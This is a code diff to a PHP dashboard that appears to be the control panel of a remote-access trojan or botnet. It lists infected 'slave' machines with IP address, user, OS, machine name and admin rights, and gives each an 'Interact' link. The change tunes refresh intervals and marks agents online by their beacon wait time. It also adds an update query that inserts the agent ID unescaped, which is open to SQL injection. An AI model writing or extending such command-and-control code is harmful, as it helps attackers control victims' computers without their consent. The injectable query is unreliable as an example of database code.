@@ -22,7 +22,7 @@ include 'conn.php';
   {
     setTimeout(function(){
       location.reload();
-  }, 90000);
+  }, 60000);
 
   }
 
@@ -43,7 +43,7 @@ include 'conn.php';
             setTimeout(function(){
               broadcasting = false;
               location.reload();
-          }, 14000);
+          }, 15000);
           }
           else
           {
@@ -163,20 +163,22 @@ reload();
 
 		                <?php
                   $num = 1;
-                  $res = $conn->query("SELECT TIMESTAMPDIFF(MINUTE, slaveLatestAction, NOW()) as timestamp, slaveId, slaveLatestAction, slaveIp,slaveUser,slaveDate,slaveStatus,slaveOperatingSystem,slaveWorkingDir, slaveMachineName, slaveIsAdmin from slaves where regCompleted='true' ORDER BY slaveStatus DESC, id DESC");
+                  $res = $conn->query("SELECT TIMESTAMPDIFF(SECOND, slaveLatestAction, NOW()) as timestamp, slaveWaitTime, slaveId, slaveLatestAction, slaveIp,slaveUser,slaveDate,slaveStatus,slaveOperatingSystem,slaveWorkingDir, slaveMachineName, slaveIsAdmin from slaves where regCompleted='true' ORDER BY slaveStatus DESC, id DESC");
                   if($res->num_rows > 0)
                   {
                     while($row = $res->fetch_assoc()){
                     $slaveid = $row["slaveId"];
                     $slaveUser = $row["slaveUser"];
-		                   $timeDiff = $row["timestamp"];
+		    $timeDiff = $row["timestamp"];
+		    $wTime = $row["slaveWaitTime"];
 
-			                     if($row["slaveStatus"] == "online" && abs($timeDiff) < 120){
+			      if($row["slaveStatus"] == "online" && abs($timeDiff) < $wTime + 5){
                         $status = "<span class='badge badge-success'>Online</span>";
                     echo "<tr name=\"online\">"."<td>". $num . "</td>"."<td>" . htmlspecialchars($row['slaveId']) . "</td>" . "<td>".  htmlspecialchars($row["slaveIp"]) . "</td>" . "<td>" . htmlspecialchars($row["slaveOperatingSystem"]) ."</td>". "<td>" . htmlspecialchars($row["slaveUser"]) ."</td>" . "<td>" . htmlspecialchars($row["slaveMachineName"]) ."</td>"."<td>" . htmlspecialchars($row["slaveIsAdmin"]) ."</td>"."<td>" . $status . "</td>". "<td>"."<a class='btn btn-sm btn-dark'". "href='/interact.php?slave=". htmlspecialchars($slaveid) . "&sid=". htmlspecialchars($slaveid). "' target=\"_blank\">Interact</a>". "</td>" ."</tr>";
                     $num++;
                   }
                   else{
+			$conn->query("update slaves set slaveStatus='offline' where slaveId='$slaveid'");
                     $status = "<span class='badge badge-danger'>Offline</span>";
                echo "<tr id=\"offline\">"."<td>". $num . "</td>"."<td>" . htmlspecialchars($row['slaveId']) . "</td>" . "<td>".  htmlspecialchars($row["slaveIp"]) . "</td>" . "<td>" . htmlspecialchars($row["slaveOperatingSystem"]) ."</td>". "<td>" . htmlspecialchars($row["slaveUser"]) ."</td>" . "<td>" . htmlspecialchars($row["slaveMachineName"]) ."</td>"."<td>" . htmlspecialchars($row["slaveIsAdmin"]) ."</td>"."<td>" . $status . "</td>". "<td>"."<a class='btn btn-sm btn-dark'". "href='/interact.php?slave=". htmlspecialchars($slaveid) . "&sid=". htmlspecialchars($slaveid). "' target=\"_blank\">Interact</a>". "</td>" ."</tr>";
                 $num++;
